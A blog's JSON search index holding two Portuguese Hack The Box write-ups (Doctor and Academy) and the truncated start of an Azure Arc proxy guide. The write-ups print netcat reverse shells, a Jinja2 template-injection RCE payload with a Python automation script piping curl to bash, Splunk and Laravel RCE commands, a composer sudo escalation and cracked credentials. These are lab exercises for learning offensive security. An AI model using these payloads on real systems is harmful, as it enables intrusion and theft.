var store = [{
        "title": "Hackthebox write-up: Doctor",
        "excerpt":"Olá pessoal!   Começando a postar sobre alguns write-ups de máquinas estilo CTF, a primeira a ser resolvida será Doctor, uma máquina Linux classificada como fácil do Hack The Box criada por egotisticalSW.   :information_source: Info: Write-ups para máquinas do Hack The Box serão postados assim que as máquinas sejam aposentadas, então segue abaixo a primeira :smiley:!      Enumeração   Então vamos começar com uma enumeração rápida utilizando o nmap. Executando um quick scan obtive o seguinte resultado, onde foi possível notar dois serviços HTTP, além de uma porta de SSH aberta:   nmap -sC -sV -Pn -oA quick 10.10.10.209 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-14 19:46 -03 Nmap scan report for 10.10.10.209 Host is up (0.17s latency). Not shown: 997 filtered ports PORT     STATE SERVICE  VERSION 22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey:  |   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA) |   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA) |_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519) 80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Doctor 8089/tcp open  ssl/http Splunkd httpd | http-robots.txt: 1 disallowed entry  |_/ |_http-server-header: Splunkd |_http-title: splunkd | ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser | Not valid before: 2020-09-06T15:57:27 |_Not valid after:  2023-09-06T15:57:27 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 63.98 seconds                                                                              80 TCP - Serviço HTTP   Antes de começar a enumeração, navegando no website utilizando o browser, notei de que se trata de um site institucional, que menciona um endereço de e-mail info@doctors.htb, onde o domínio doctors.htb deve se tratar do FQDN desta máquina.      Para garantir que a enumeração dos serviços HTTP seja feita corretamente, caso algum deles esteja sendo publicado por este DNS, alterei o arquivo hosts local para refletir o nome correto para o endereço IP da máquina, podendo assim iniciar o processo de enumeração dos serviços.   $ sudo -i # echo \" \" &gt;&gt; /etc/hosts # echo \"# HTB Doctors\" &gt;&gt; /etc/hosts # echo \"10.10.10.209 doctors.htb\" &gt;&gt; /etc/hosts # cat /etc/hosts  127.0.0.1       localhost 127.0.1.1       kali  # The following lines are desirable for IPv6 capable hosts ::1     localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters   # HTB Doctors 10.10.10.209 doctors.htb   Após alterar a entrada, uma vez acessando novamente a porta 80/TPC, desta vez via hostname, uma página diferente é exibida, conforme podemos ver abaixo:      Agora que confirmamos que a máquina possui um outro serviço publicado usando o dns, vamos começar enumerando os dois websites, tanto com DNS quanto IP, para que possamos buscar por alguma oportunidade interessante para um acesso inicial.   Whatweb   Verificando o output do whatweb de ambos os scans, podemos notar que os dois websites são publicados utilizando diferentes webservers, conforme abaixo:      Via IP address: Apache[2.4.41], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], Email[info@doctors.htb], HTML5, Script, Bootstrap[4.3.1], JQuery[3.3.1]   Via DNS: HTTPServer[Werkzeug/1.0.1 Python/3.8.2], Cookies[session], Python[3.8.2], HttpOnly[session], Werkzeug[1.0.1], RedirectLocation[http://doctors.htb/login?next=%2F]   Enumerando o website manualmente   Enquanto validando o website notei que na página de login havia também a possibilidade de resetar uma senha ou criar uma conta. A informação de endereço de e-mail que temos (info@doctors.htb) foi a primeira a ser testada mas os erros recebidos indicaram que a conta não existia.   Após algumas tentativas, tentando manipular os requests de alteração de senha, decidi por mudar de estratégia e tentar criar uma conta.      Depois de criá-la com sucesso, uma mensagem de aviso foi exibida conforme abaixo, o que significa que teremos apenas 20 minutos para utilizar a conta no site.      Depois de criada, iniciada a enumeração pelo código fonte da página, onde encontrei um diretorio /archive comentado no código, mas nada foi exibido quando acessei a página pela primeira vez.    &lt;!--archive still under beta testing&lt;a class=\"nav-item nav-link\" href=\"/archive\"&gt;Archive&lt;/a&gt;--&gt;   Avaliando as demais possibilidades parti para a criação de uma nova mensagem, uma das opções disponíveis, onde inseri o seguinte conteúdo para testes:      Acessando a mensagem postada na sequência, notei que é direcionado para a URL http://doctors.htb/post/2 mas também não consegui identificar nenhuma outra oportunidade de exploração neste ponto, apenas as opções padrão para alterar ou deletar a mensagem.   Manipulando a url, consegui acessar outros posts, como por exemplo http://doctors.htb/post/1 que se tratava de uma mensagem do usuário admin mas que não possuia nenhuma informação relevante.   As coisas ficaram interessantes quando decidi acessar novamente o /archive, onde o conteúdo do título utilizado na mensagem criada foi exibido, o que levantou a possibilidade de obter um acesso inicial a partir da exploração via Server-Side Template Injection (SSTI).   Para confirmar a possibilidade, seguindo o que encontrei em SSTI (Server Side Template Injection) - HackTricks, troquei o conteúdo do título da minha mensagem anterior para testar alguns tipos de injeção sugeridos, que nos permitirá identificar qual a engine utilizada e, posteriormente, criar o conteúdo malicioso para obter um acesso inicial.      Esta injeção funcionou com sucesso, indicando que temos um website construido com Twig ou Jinja2 :smile: (o que faz sentido, já que o webservice é publicado utilizando Werkzeug, conforme pudemos notar via whatweb, que é um servidor web muito popular utilizado normalmente em conjunto com Flask ou Django).      Depois de alguns testes, brincando com exemplos disponíveis em PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings (github.com), consegui confirmar que a engine utilizada é Jinja2, onde o conteúdo abaixo funcionou sem problemas, dentre outros:   {{config.items()}}   Acesso inicial   Após confirmado que um payload para Jinja2 deveria ser utilizado, foi possível obter um shell reverso na máquina através do seguinte processo:           Em uma pasta na máquina do atacante, criei um arquivo de payload contendo a string que, uma vez executada, nos retornaria um shell reverso na porta 4443;       rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f                Este arquivo foi publicado a partir de um server HTTP simples utilizando python3, conforme execução do comando abaixo a partir do diretório onde o arquivo criado está localizado;         sudo python3 -m http.server 80                No portal, criei um novo post inserindo no lugar da string title, o conteúdo obtido no link acima citado do PayloadsAllTheThings. Este especificamente é bem interessante, pois nos permite executar comandos de forma dinâmica a partir do conteúdo recebido da variável input em um request do tipo GET, evitando assim modificar frequentemente o conteúdo da injeção:       {% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}                Iniciei um listener usando netcat para ouvir na porta configurada no payload usando o comando abaixo;       nc -lnvp 4443                E depois fiz um request no portal, passando o comando que gostaria de ser executado na query string com o comando no input que gostaria que fosse executado.       http://doctors.htb/archive?input=curl%20-L%20http://10.10.10.10/payload%20|%20bash                E voilá! Recebi um shell reverso :smiley:          Bônus: Pra facilitar na reobtenção deste acesso inicial, uma vez que a conta criada tem a validade curta de 20 min, criei um script simples em python para esta tarefa :smiley:.​ Para usá-lo basta configurar o listener e o webserver, da mesma forma que faríamos no método 100% manual, com a diferença de que o script irá recriar o usuário, configurar o payload malicioso na mensagem e fazer o request retornando o shell reverso novamente.   #!/usr/bin/python3  import requests  url = 'http://doctors.htb' username = 'dummy' password = 'P@ssw0rd' ip = '10.10.10.10' email = username+'@doctors.htb'  # Create new session s = requests.session()  # Make initial request to get required cookies r = s.get(url)  # Create user payload = {'username':username,'email':email,'password':password,'confirm_password':password,'submit':'Sign Up'} r = s.post(url+'/register',data=payload)  # Login payload = {'email':email,'password':password,'submit':'Login'} r = s.post(url+'/login?next=%2Fhome',data=payload)  # Create message  title = \"{% for x in ().__class__.__base__.__subclasses__() %}{% if \\\"warning\\\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}\"  payload = {'title':title,'content':'content','submit':'Post'} r = s.post(url+'/post/new',data=payload)  # Get Reverse shell command = requests.utils.quote('curl -L http://'+ip+'/payload | bash') r = s.get(url+'/archive?input='+command)   User flag   Depois de obter o shell reverso, fiz o upgrade dele para ter acesso a funcionalidades de auto-complete, etc, e iniciei o processo de enumeração:           Os usuários existentes na máquina, com base nas home folders existentes são shaun e web;            Verificando os grupos dos quais o usuário web é membro, notei que a conta é membro do grupo adm:       web@doctor:/home$ id uid=1001(web) gid=1001(web) groups=1001(web),4(adm)                  O grupo adm no Linux permite acesso a arquivos localizados no diretório /var/log, que possivelmente pode permitir que consigamos alguma informação sensivel dentro das logs de componentes do sistema como webservers e tarefas agendadas (cron).           Analizando as logs em /var/log   Então para iniciar esta análise vamos buscar quais componentes, alem dos defaults de sistema, temos dentro desta máquina:   web@doctor:/var/log$ ls -ld */ drwxr-x---  2 root              adm             4096 Jan 31 00:00 apache2/ drwxr-xr-x  2 root              root            4096 Sep  7 12:13 apt/ drwxr-xr-x  2 root              root            4096 Jan 31 00:00 cups/ drwxr-xr-x  2 root              root            4096 Apr  8  2020 dist-upgrade/ drwxr-xr-x  3 root              root            4096 Apr 23  2020 hp/ drwxrwxr-x  2 root              root            4096 Jul 26  2020 installer/ drwxr-sr-x+ 3 root              systemd-journal 4096 Jul 20  2020 journal/ drwxr-xr-x  2 root              root            4096 Sep  5  2019 openvpn/ drwx------  2 root              root            4096 Apr 23  2020 private/ drwx------  2 speech-dispatcher root            4096 Jan 19  2020 speech-dispatcher/ drwxr-x---  2 root              adm             4096 Jan 30 19:13 unattended-upgrades/   Iniciando com os logs do Apache2, como este é um dos serviços previamente enumerados e, considerando a data de criação desta máquina (assim podemos ignorar as informações mais recentes nela, que podem ser fruto de atividades de outros usuários), encontrei um arquivo interessante chamado backup que não é padrão do serviço:   web@doctor:/var/log/apache2$ ls -la | grep -v 'Jan 3' total 7980 -rw-r-----  1 root adm       1266 Sep  5 11:58 access.log.10.gz -rw-r-----  1 root adm        323 Aug 21 13:00 access.log.11.gz -rw-r-----  1 root adm        270 Aug 18 12:48 access.log.12.gz -rw-r--r--  1 root root   2194472 Jul 27  2020 access.log.13.gz -rw-r-----  1 root adm        668 Sep 28 15:02 access.log.2.gz -rw-r-----  1 root adm       1493 Sep 23 15:20 access.log.3.gz -rw-r-----  1 root adm       3951 Sep 22 12:58 access.log.4.gz -rw-r-----  1 root adm       1341 Sep 19 19:17 access.log.5.gz -rw-r-----  1 root adm     664054 Sep 15 14:27 access.log.6.gz -rw-r-----  1 root adm        384 Sep 14 10:07 access.log.7.gz -rw-r-----  1 root adm       3018 Sep  7 17:24 access.log.8.gz -rw-r-----  1 root adm       1338 Sep  6 22:46 access.log.9.gz -rw-r-----  1 root adm      21578 Sep 17 16:23 backup -rw-r-----  1 root adm        460 Sep 15 00:00 error.log.10.gz -rw-r-----  1 root adm        476 Sep  7 17:46 error.log.11.gz -rw-r-----  1 root adm        537 Sep  6 22:47 error.log.12.gz -rw-r-----  1 root adm        680 Sep  5 11:58 error.log.13.gz -rw-r-----  1 root adm        341 Sep  5 00:00 error.log.14.gz -rw-r-----  1 root adm        789 Sep 28 15:07 error.log.2.gz -rw-r-----  1 root adm       1092 Sep 23 15:42 error.log.3.gz -rw-r-----  1 root adm        846 Sep 22 13:03 error.log.4.gz -rw-r-----  1 root adm        655 Sep 22 10:40 error.log.5.gz -rw-r-----  1 root adm        352 Sep 19 00:00 error.log.6.gz -rw-r-----  1 root adm        424 Sep 18 00:00 error.log.7.gz -rw-r-----  1 root adm        428 Sep 17 00:00 error.log.8.gz -rw-r-----  1 root adm        629 Sep 16 00:00 error.log.9.gz -rw-r--r--  1 root root         0 Jul 27  2020 other_vhosts_access.log   Verificando seu conteúdo, buscando pelas query strings únicas logadas nos requests, encontramos uma entrada interessante que traz um valor que possivelmente poderia ser utilizado como senha: Guitar123   web@doctor:/var/log/apache2$ awk -F\" \" '{print $7}' backup | sort | uniq / 12.1.2\\n\" 400 /evox/about /favicon.ico /.git/HEAD /HNAP1 /home /icons/ubuntu-logo.png /login /nmaplowercheck1599231606 /nmaplowercheck1599231646 /post/new /register /reset_password?email=Guitar123\" /robots.txt /sdk /static/main.css /static/profile_pics/default.gif   Como o outro usuário desta máquina é o shaun, tentando utilizar o usuário e senha que temos até o momento, tive sucesso ao logar com a conta mencionada, o que permitiu obter a flag contida em /home/shaun/user.txt:   web@doctor:~$ su shaun Password:  shaun@doctor:~$ ls -la total 44 drwxr-xr-x 6 shaun shaun 4096 Sep 15 12:51 . drwxr-xr-x 4 root  root  4096 Sep 19 16:54 .. lrwxrwxrwx 1 root  root     9 Sep  7 14:31 .bash_history -&gt; /dev/null -rw-r--r-- 1 shaun shaun  220 Sep  6 16:26 .bash_logout -rw-r--r-- 1 shaun shaun 3771 Sep  6 16:26 .bashrc drwxr-xr-x 4 shaun shaun 4096 Sep 22 13:00 .cache drwx------ 4 shaun shaun 4096 Sep 15 11:14 .config drwx------ 4 shaun shaun 4096 Sep 15 11:57 .gnupg drwxrwxr-x 3 shaun shaun 4096 Sep  6 18:01 .local -rw-r--r-- 1 shaun shaun  807 Sep  6 16:26 .profile -rw-rw-r-- 1 shaun shaun   66 Sep 15 12:51 .selected_editor -r-------- 1 shaun shaun   33 Jan 30 19:12 user.txt shaun@doctor:~$ cat user.txt  &lt;redacted&gt;   Root flag   Agora logado como shaun, notei que ele não possui nenhum privilégio especial na maquina, além de não ter direitos de executar quaisquer comandos como root a partir do sudo:   shaun@doctor:/tmp$ sudo -l [sudo] password for shaun:  Sorry, user shaun may not run sudo on d   Após executar o script linpeas.sh do PEASS - Privilege Escalation Awesome Scripts SUITE, verificando os serviços em execução, o mais provável meio de obter um acesso root seria a partir do serviço splunkd, que está em execução com a conta de sistema e está publicado na porta TCP 8089, conforme listado no scan de reconhecimento inicial.   Acessando este serviço manualmente, ao clicar no link services, conforme listado abaixo, uma janela de autenticação é exibida. Como a única credencial que possuímos é a do usuário shaun foi a primeira a ser tentada, onde tive sucesso :smiley:.         Uma vez que temos credenciais para logon no serviço do Splunk, o próximo passo é encontrar uma forma de obter execução remota de código através do mesmo. Após alguma pesquisa, encontrei este link Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper’s Blog que menciona um script disponível em GitHub - cnotin/SplunkWhisperer2: Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations, que permitirá exatamente o que estávamos procurando.   Após executar o comando conforme abaixo, foi possível obter um shell reverso rodando sob o contexto de root:   $ python3 ./PySplunkWhisperer2_remote.py --host 10.10.10.209 --port 8089 --username shaun --password Guitar123 --payload \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f\" --lhost 10.10.10.10 Running in remote mode (Remote Code Execution) [.] Authenticating... [+] Authenticated [.] Creating malicious app bundle... [+] Created malicious app bundle in: /tmp/tmpcae79s9x.tar [+] Started HTTP server for remote mode [.] Installing app from: http://10.10.10.10:8181/ 10.10.10.209 - - [04/Feb/2021 19:46:38] \"GET / HTTP/1.1\" 200 - [+] App installed, your code should be running now!  Press RETURN to cleanup  [.] Removing app... [+] App removed [+] Stopped HTTP server Bye!   A partir deste shell, a obtenção da flag em /root/root.txt pode ocorrer sem problemas.   # cat /root/root.txt &lt;redacted&gt;   Espero que tenha sido útil!   Até o próximo post! :smile:  ","categories": ["Writeup"],
        "tags": ["HackTheBox","htb-easy","htb-linux"],
        "url": "https://davicruz.com/writeup/2021/02/htb-doctor/",
        "teaser": "https://i.imgur.com/EeJREQG.png"
      },{
        "title": "Hackthebox write-up: Academy",
        "excerpt":"Olá pessoal!   A máquina desta semana será Academy, outra máquina Linux classificada como fácil do Hack The Box, criada por egre55 e mrb3n.   :information_source: Info: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas      Enumeração   Iniciado enumeração, como de costume, executando um scan rápido do nmap para vermos o que está em execução nesta máquina.   $ nmap -sC -sV -Pn -oA quick 10.10.10.215 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 12:32 -03 Nmap scan report for 10.10.10.215 Host is up (0.15s latency). Not shown: 998 closed ports PORT   STATE SERVICE VERSION 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 (RSA) |   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 (ECDSA) |_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 (ED25519) 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Did not follow redirect to http://academy.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 34.43 seconds   80 TCP - Serviço HTTP   Verificando este serviço do scan do nmap, notei que a página contém um redirect para o host academy.htb, que é provavelmente o nome pelo qual esta máquina responde e que minha máquina não conseguiu resolver. Após adicioná-lo no meu arquivo /etc/hosts, foi possível navegar para a página abaixo, que contém dois links: um para registro e outro para login na página do serviço HTB Academy.      Como o código fonte da página não continha nada oculto, segui com a criação de uma conta para testes (dummy:P@ssword) para obter algum acesso no serviço. Durante a criação da conta notei algo interessante enviado no POST request, onde um campo oculto do formulário enviava o parametro roleid, definindo seu valor para 0.   POST /register.php HTTP/1.1 Host: academy.htb Content-Length: 57 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://academy.htb Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://academy.htb/register.php Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=amjdd7mhh764rbt4jvb0ujqa1i Connection: close  uid=dummy&amp;password=P%40ssw0rd&amp;confirm=P%40ssw0rd&amp;roleid=0   Vamos dar continuidade com os valores padrão por enquanto embora já saibamos de uma oportunidade de adulterar este parametro se necessário.   Depois de acessar o serviço com a credencial recentemente criada, notei que o usuário é capaz de ver o catálogo de serviços, com alguns créditos pré-carregados, porém nenhuma operação (unlock) foi possível uma vez que a API estava indisponível (http://academy.htb/api/modules/unlock), retornando erro HTTP 404.      Gobuster   Uma vez que chegamos neste fim de linha, decidi por iniciar um brute force nos diretórios deste app para identificar alguma feature oculta que pudesse nos levar a um acesso inicial. Executando o gobuster pudemos encontrar 2 itens interessantes a serem investigados: admin.php e config.php.   gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://academy.htb -t 50 -o gobuster_80.txt -x php,html,txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url:            http://academy.htb [+] Threads:        50 [+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes:   200,204,301,302,307,401,403 [+] Cookies:        PHPSESSID=amjdd7mhh764rbt4jvb0ujqa1i [+] User Agent:     gobuster/3.0.1 [+] Extensions:     txt,php,html [+] Timeout:        10s =============================================================== 2021/02/17 12:51:55 Starting gobuster =============================================================== /index.php (Status: 200) /images (Status: 301) /login.php (Status: 200) /home.php (Status: 200) /register.php (Status: 200) /admin.php (Status: 200) /config.php (Status: 200) Progress: 48339 / 220561 (21.92%)in.php (Status: 200)    admin.php   Acessando admin.php notei que a tela de logon se parece bastante com a tela de login anterior, porém nossas credenciais de testes não funcionaram. Lembrando que temos uma oportunidade de adulterar detalhes da criação do usuário, decidi por criar uma nova conta, desta vez alterando o parametro roleid substituindo o valor 0 no request por 1. Com esta nova conta, cujo roleid=1, consegui acessar a área restrita, onde o conteúdo abaixo doi exibido:      Embora não possua nenhuma informação oculta no fonte, o que chamou atenção foi o host dev-staging-01.academy.htb, que possivelmente também encontra-se em execução nesta máquina.   Após adicionar este host no arquivo hosts sob o mesmo endereço IP da máquina, o conteúdo abaixo foi exibido, que é um framework para tratativa de erros no PHP que permite aos desenvolvedores debugar seu código, mas neste caso estava aberto e vazando uma série de informações como credenciais e variáveis de ambiente.      O que mais chamou a atenção dentre os dados vazados foram as credenciais de MySQL e App_key do Laravel, que podem nos levar a um acesso inicial nesta máquina.   Acesso inicial   Como não temos a porta MySQL 3306/TCP aberta nesta máquina, com base no scan inicial do nmap, fazendo uma rápida pesquisa na internet pelo que seria possível alcançar com a App_key do Laravel encontrei o CVE-2018-15133 que pode nos levar a uma execução remota de código através de uma chamada de deserialização em algumas versões afetadas do Laravel. Se tivermos sorte isto deve funcionar para esta máquina :smiley:.   Realizando algumas pesquisas adicionais, encontrei este repositório que implementa este exploit de uma forma simples e que foi utilizado para obter um shell reverso nesta máquina.   python3 ./pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f\"   User flag   Após realizar o upgrade do shell reverso, primeira coisa a se checar foi o arquivo config.php enumerado anteriormente, o qual encontra-se listado abaixo:   www-data@academy:/var/www/html$ cat ./academy/public/config.php  &lt;?php ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); $link=mysqli_connect('localhost','root','GkEWXn4h34g8qx9fZ1','academy'); ?&gt;   Conectando à instancia local do MySQL utilizando das credenciais obtidas, notei que haviam alguns usuários criados na base, assim como o hash de suas senhas, que poderiam ter sido reutilizadas por algum dos usuários existentes nesta máquina.   $ mysql -u root -p Password:  mysql&gt; use academy; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A  Database changed mysql&gt; select * from users; +----+----------+----------------------------------+--------+---------------------+ | id | username | password                         | roleid | created_at          | +----+----------+----------------------------------+--------+---------------------+ |  5 | dev      | a317f096a83915a3946fae7b7f035246 |      0 | 2020-08-10 23:36:25 | | 11 | test8    | 5e40d09fa0529781afd1254a42913847 |      0 | 2020-08-11 00:44:12 | | 12 | test     | 098f6bcd4621d373cade4e832627b4f6 |      0 | 2020-08-12 21:30:20 | | 13 | test2    | ad0234829205b9033196ba818f7a872b |      1 | 2020-08-12 21:47:20 | | 14 | tester   | 098f6bcd4621d373cade4e832627b4f6 |      1 | 2020-08-13 11:51:19 | +----+----------+----------------------------------+--------+---------------------+   Após algumas buscas, descobri que estes hashes foram gerados com MD5 antes de armazenados no banco. Utilizando alguns serviços online, as seguintes senhas foram obtidas:      dev: mySup3rP4s5w0rd!!   test8: test8   test: test   test2: test2   tester: test   Agora que temos algumas senhas, precisamos validar qual usuário possivelmente possui a flag de user.txt. Executando o comando abaixo identificamos o arquivo no diretório do user cry0l1t3, para o qual tentaremos as senhas obtidas até o momento:   www-data@academy:/home$ find /home -type f 2&gt;/dev/null | grep user.txt /home/cry0l1t3/user.txt   Na primeira tentativa, utilizando mySup3rP4s5w0rd!! consegui logar com a conta cry0l1t3 e obter a flag de usuário.   cry0l1t3@academy:~$ cat user.txt  &lt;redacted&gt;   Root flag   Agora executando com a conta cry0l1t3, podemos seguir com a enumeração desta máquina. A primeira coisa a se fazer é checar o que este usuário é capaz de executar. O usuário cry0l1t3 não pode executar nada como root, baseado no output do comando sudo -l , porém é membro do grupo adm, que permite a leitura dos conteúdos do diretório /var/log onde alguma informação sensível pode ser vazada.   cry0l1t3@academy:~$ sudo -l [sudo] password for cry0l1t3:  Sorry, user cry0l1t3 may not run sudo on academy. cry0l1t3@academy:~$ id uid=1002(cry0l1t3) gid=1002(cry0l1t3) groups=1002(cry0l1t3),4(adm)   Sempre que inspecionando logs em máquinas de CTF é importante considerar a sua data de criação, permitindo que os registros dos outros jogadores sejam ignorados na verificação. Uma forma simples de se alcançar isso é através do comando abaixo, que filtra apenas os arquivos mais antigos que X dias, no meu caso 100 que é o período de dias desde que esta máquina foi lançada no momento que estou resolvendo a mesma.   find /var/log -mtime +100 -print 2&gt;/dev/null   Verificando primeiro os logs do apache, nada interessante foi encontrado a partir dos access logs logo, na sequência, os logs de auditoria e de cron são os próximos a serem validados.   Verificando os logs de auditoria podemos ver 2 arquivos do período mencionado, que serão inspecionados a seguir.   cry0l1t3@academy:~$ find . -mtime +100 -print 2&gt;/dev/null | grep audit /var/log/audit/audit.log.2 /var/log/audit/audit.log.3   Buscando por comandos interessantes que foram auditados (sudo, su, passwd) e que possivelmente poderiam conter algum dado sensível, tive sorte e encontrei uma execução de su:   cry0l1t3@academy:~$ cat /var/log/audit/audit.log.[2-3] | grep '\"su\"' type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=\"su\" data=6D7262336E5F41634064336D79210A   O campo data contém um valor em HEX do parametro utilizado nesta execução, que pode ser convertido para ASCII. Você pode utilizar qualquer conversor online mas também pode utilizar o vim para esta tarefa, conforme descrito abaixo:           Abrir um arquivo em modo de ediçaõ com vim       vi /tmp/test                Pressione Esc para entrar em modo de comando e digite :% !xxd. Isto irá converter o conteúdo atual do arquivo para hexadecimal.            Agora pressionando a tecla i vai ativar o modo de inserção (insert mode), onde vamos colar o conteúdo HEX obtido logo após o valor 00000000:.            Pressionando Esc novamente para retornar no modo commando e digitando :% !xxd -r fará que o conteudo exa seja convertido para ASCII.            Você poderá salvar e sair a partir do comando :wq!  mas neste momento já deve ter visto o conteúdo convertido do valor HEX. Abaixo o output do arquivo que criei para realizar esta conversão:       cat /tmp/test                     mrb3n_Ac@d3my!           Como mrb3n é um dos usuários desta máquina este pode ser possivelmente a sua senha, o que foi confirmado a partir da execuçaõ do comando su mrb3n e digitando a senha encontrada.   Enumerando suas permissões, notei que ele não é membro de nenhum grupo especial na máquina porém possui privilégios para executar o binário composer com privilégios de root.   mrb3n@academy:~$ id uid=1001(mrb3n) gid=1001(mrb3n) groups=1001(mrb3n) mrb3n@academy:~$ sudo -l [sudo] password for mrb3n:  Matching Defaults entries for mrb3n on academy:     env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin  User mrb3n may run the following commands on academy:     (ALL) /usr/bin/composer   Abusando das permissões de sudo   Buscando no GTFOBins vi que é possivel escalar privilégios utilizando o composer a partir da execução do snippet abaixo, que funcionou sem grandes problemas:   TF=$(mktemp -d) echo '{\"scripts\":{\"x\":\"/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3\"}}' &gt;$TF/composer.json sudo composer --working-dir=$TF run-script x   Como root, finalmente obtive a flag no caminho /root/root.txt   root@academy:~# id uid=0(root) gid=0(root) groups=0(root) root@academy:~# cat root.txt  &lt;redacted&gt; root@academy:~#   Espero que tenham gostado!   Vejo vocês novamente em breve! :smiley:  ","categories": ["Writeup"],
        "tags": ["HackTheBox","htb-easy","htb-linux"],
        "url": "https://davicruz.com/writeup/2021/02/htb-academy/",
        "teaser": "https://i.imgur.com/PjYV5g5.png"
      },{
        "title": "Azure Arc enabled Servers: Configuração de proxy a nível de serviço em Linux",
        "excerpt":"Algumas vezes, durante engajamentos com clientes, recebo questionamentos de como configurar o proxy para acesso à internet apenas em serviços específicos e com o Azure Arc para Servidores Linux isso não é diferente.   Neste post irei guiá-los quanto ao procedimento de configuração de proxy apenas para o Arc, sem definir o proxy de maneira global no Linux.   Configuração default   Por padrão, quando especificamos um servidor proxy na instalação do agente do Azure Arc for Linux Server, o utilitário azcmagent_proxy é invocado para automatizar estas configurações, que possui as seguintes opções:   dcruz@vmlx02:~$ sudo azcmagent_proxy Usage:  azcmagent_proxy add &lt;URL&gt; - to add URL as the proxy         azcmagent_proxy remove - to delete configured proxy dcruz@vmlx02:~$   Quando configuramos o proxy a partir deste método, dois arquivos são alterados, conforme podemos ver abaixo:   dcruz@vmlx02:~$ sudo azcmagent_proxy add http://vmlx01:3128     No proxy previously configured Removing proxy environment variable from file:  /opt/azcmagent/bin/azcmagent     No proxy previously configured Setting proxy environment variable to file:  /lib/systemd/system.conf.d/proxy.conf Adding proxy environment variable to file:  /opt/azcmagent/bin/azcmagent dcruz@vmlx02:~$   O primeiro deles, o /lib/systemd/system.conf.d/proxy.conf, que define o proxy a todos os serviços systemd de forma global, enquanto o arquivo /opt/azcmagent/bin/azcmagent, que é o wrapper do utilitário de linha de comando do Arc, também recebe esta configuração.   Alterando o proxy apenas para o Azure Arc   A fim de configurar os serviços para que tenham a conectividade necessária, sem ativar o proxy de forma global ao systemd é necessário editar cada um dos arquivos de unidade(unity files), conforme descrito abaixo:           Se o proxy foi configurado utilizando o azcmagent_proxy e deseja remover as configurações feitas por ele, é necessário executar a linha de comando abaixo com o parâmetro remove       sudo azcmagent_proxy remove                Adicionalmente, para cada um dos arquivos dos 3 serviços utilizados pelo Azure Arc for Linux Servers (himdsd.service ,gcad.service ,extd.service), que estão localizados no diretório /lib/systemd/system, precisamos incluir um parâmetro na seção [Service] com a variável de ambiente https_proxy, conforme exemplo abaixo e que pode ser visto também na documentação do systemd:       [Service] # [...] Environment=https_proxy=http://vmlx01:3128                Após alterar os arquivos 